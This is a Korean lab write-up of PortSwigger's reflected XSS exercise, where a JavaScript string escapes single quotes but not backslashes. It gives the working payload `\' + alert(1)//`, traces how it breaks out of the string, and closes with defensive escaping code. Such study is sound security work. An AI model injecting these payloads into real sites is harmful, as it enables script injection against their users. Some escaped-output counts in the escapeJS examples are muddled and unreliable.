# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / JS 문자열 / `\` 미이스케이프로 `'` 이스케이프 무력화
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

## 목표

`<>`, `"` 가 HTML 인코딩되고 `'` 가 `\'` 로 이스케이프되지만, `\` 자체는 이스케이프되지 않는 허점을 이용해 `alert()` 를 실행시킨다.

## 취약점 분석

서버의 이스케이프 처리:

```
입력: <   → 출력: &lt;   (HTML 인코딩)
입력: >   → 출력: &gt;   (HTML 인코딩)
입력: "   → 출력: &quot; (HTML 인코딩)
입력: '   → 출력: \'    (이스케이프)
입력: \   → 출력: \     (처리 없음 ← 허점)
```

검색어가 JS 문자열에 반영된다.

```html
<script>
  var searchTerms = 'USER_INPUT';
</script>
```

## 공격 방법

### 페이로드

```
\' + alert(1)//
```

### 서버 처리 후 생성되는 JS

```javascript
var searchTerms = '\\' + alert(1)//';
```

### 파싱 흐름

```
입력: \  '  공백 + alert(1)//
      ↓  ↓
서버:  \  \'  (\ 는 그대로, ' 만 이스케이프)
      ↓
JS 코드: '\\'  +  alert(1)//';
          ↑↑    ↑
          \\    '  → 문자열 종료!
          │
          리터럴 백슬래시 1개로 소비

결과 해석:
  '\\' → 내용이 리터럴 \ 인 문자열
  + → 연결 연산자
  alert(1) → 실행!
  // → 뒤따르는 '; 를 주석 처리
```

## 이전 랩들과의 비교 — JS 문자열 탈출 방법 3종

| 항목 | 009 랩 | 012 랩 (DOM) | 018 랩 | 019 랩 (이번) |
|------|--------|-------------|--------|--------------|
| `<>` 처리 | HTML 인코딩 | — (JSON) | HTML 인코딩 | HTML 인코딩 |
| `"` 처리 | — | `\"` 이스케이프 | — | HTML 인코딩 |
| `'` 처리 | **없음** | — | `\'` 이스케이프 | `\'` 이스케이프 |
| `\` 처리 | **없음** | **없음** | `\\` 이스케이프 | **없음** ← 허점 |
| 탈출 방법 | `'` 직접 삽입 | `\"` → `\\"` | `</script>` | `\'` → `\\'` |
| 페이로드 | `'-alert(1)-'` | `\"-alert(1)}//` | `</script><img...>` | `\' + alert(1)//` |

**009 vs 019 의 핵심 차이**:
- 009: `'` 가 이스케이프되지 않아 직접 삽입
- 019: `'` 는 이스케이프되지만 `\` 가 이스케이프되지 않아 `\'` 로 우회

**012 vs 019 의 공통점**:
- 두 랩 모두 `\` 를 이스케이프하지 않는 허점을 이용
- `\` 를 먼저 삽입해 서버의 이스케이프용 `\` 를 리터럴 문자로 소비시킴
- 컨텍스트만 다름 — 012는 JSON + `eval()`, 019는 직접 JS 문자열

## `\` 미이스케이프 우회의 공통 원리

```
[서버가 ' 를 이스케이프할 때]

올바른 처리 (순서 중요):
  1단계: \ → \\   (\ 먼저 이스케이프)
  2단계: ' → \'

  입력 \' 결과: \\\'  → JS에서 \\ = 리터럴 \, \' = 이스케이프된 '
  → 탈출 불가 (018 랩이 막힌 이유)

잘못된 처리 (\ 를 건드리지 않음):
  ' → \'  (\ 는 무처리)

  입력 \' 결과: \\'   → JS에서 \\ = 리터럴 \, ' = 문자열 종료!
  → 탈출 성공 (이번 랩)
```

## 핵심 정리

- `'` 를 `\'` 로 이스케이프해도 `\` 자체를 이스케이프하지 않으면 `\'` 입력으로 우회 가능하다.
- `\` 가 리터럴 문자로 소비되어 서버가 삽입한 `\` 가 무력화되고, 뒤의 `'` 가 문자열을 종료한다.
- 이는 012 랩에서 JSON `"` 이스케이프를 우회한 원리와 완전히 동일하다 — 컨텍스트만 다르다.
- **방어**: `\` 를 `\\` 로 먼저 이스케이프한 후 `'` 를 `\'` 로 이스케이프 (순서가 중요), 또는 `JSON.stringify()` 사용.

## 배운 점 및 추가 학습

### 1. JS 문자열 이스케이프 완전 결정 트리 (009~019 종합)

```
JS 문자열에 사용자 입력이 반영되는 상황
          │
          ├── ' 이스케이프 없음
          │     → 009 방식: '-alert(1)-'  또는  ';alert(1)//
          │
          ├── ' → \', \ 이스케이프 없음   ← 이번 랩 (019)
          │     → \' + alert(1)//
          │     (012 랩의 JSON 버전과 동일 원리)
          │
          ├── ' → \', \ → \\ (올바른 순서)
          │     → JS 문자열 탈출 불가
          │     → 018 방식: </script> 로 블록 자체 종료
          │
          └── ' → \', \ → \\, < → &lt; 모두 처리
                → XSS 불가 (완전한 방어)
```

### 2. 올바른 JS 문자열 이스케이프 구현

```javascript
// 위험 — \ 를 이스케이프하지 않음 (이번 랩 취약점)
function escapeJS(str) {
    return str.replace(/'/g, "\\'");
    // 입력 \' → 출력 \\'  → 탈출 가능
}

// 위험 — 순서 오류 (' 를 먼저 처리)
function escapeJS(str) {
    return str
        .replace(/'/g, "\\'")   // ' → \'
        .replace(/\\/g, "\\\\") // \ → \\ (이미 \'의 \도 \\로 됨)
    // 입력 \' → 1단계 후: \\\' → 2단계 후: \\\\\\'
    // JS: \\\\ = \\, \' = 이스케이프된 ' → 탈출 불가처럼 보이지만
    // 실제로는 \\\' 가 \\\ + ' 로 해석될 수 있어 위험
}

// 올바른 처리 — \ 를 먼저 이스케이프
function escapeJS(str) {
    return str
        .replace(/\\/g, "\\\\") // \ → \\ (반드시 먼저)
        .replace(/'/g, "\\'");  // ' → \'
    // 입력 \' → 1단계: \\' → 2단계: \\\\'
    // JS: \\\\ = 리터럴 \\, \' = 이스케이프된 ' → 탈출 불가
}

// 가장 안전 — JSON.stringify() 활용
const value = JSON.stringify(userInput);
// ' → '  (JSON은 ' 를 이스케이프 안 해도 됨, " 로 감싸짐)
// \ → \\
// < → <  (일부 구현에서 유니코드 이스케이프)
// 결과를 JS 코드에 직접 삽입 가능
```

### 3. 이스케이프 처리 순서가 중요한 이유

```
잘못된 순서 예시:
  입력: &
  1단계 < → &lt;   → &
  2단계 & → &amp;  → &amp; (이미 변환된 & 도 재변환!)
  → 이중 인코딩 버그

올바른 순서:
  1단계 & → &amp;  → &amp;
  2단계 < → &lt;   → &lt; (& 는 이미 처리됨)
  → 정상

JS 이스케이프도 동일:
  \ 먼저, ' 나중 → 올바른 처리
  ' 먼저, \ 나중 → \ 가 이미 삽입된 \' 의 \ 도 다시 처리해 꼬임
```

### 4. `+` 연산자를 선택한 이유

009 랩에서 배운 연산자 중 `+` 를 선택한 이유:

```javascript
// \ 로 문자열을 닫은 후 상황:
var x = '\\' [페이로드] //';
//       ↑↑
//       \\  → 문자열 내용이 리터럴 \
//         ' → 문자열 종료

// 가능한 연산자들
var x = '\\' + alert(1)//'  → + 연결 (문자열 + undefined)
var x = '\\' - alert(1)//'  → - 뺄셈 (NaN)
var x = '\\' == alert(1)//' → 비교

// '\\' 는 문자열이므로 + 를 쓰면 문자열 연결로 동작하지만
// alert(1) 은 undefined 반환 → '\' + undefined = '\undefined'
// → 에러 없이 alert 실행
```

`-` 도 동작하지만 문자열 `'\\'` 와 `undefined` 간 뺄셈이 `NaN` 이 되는 것도 에러 없이 처리된다. 어느 연산자든 `alert()` 실행 자체는 보장된다.
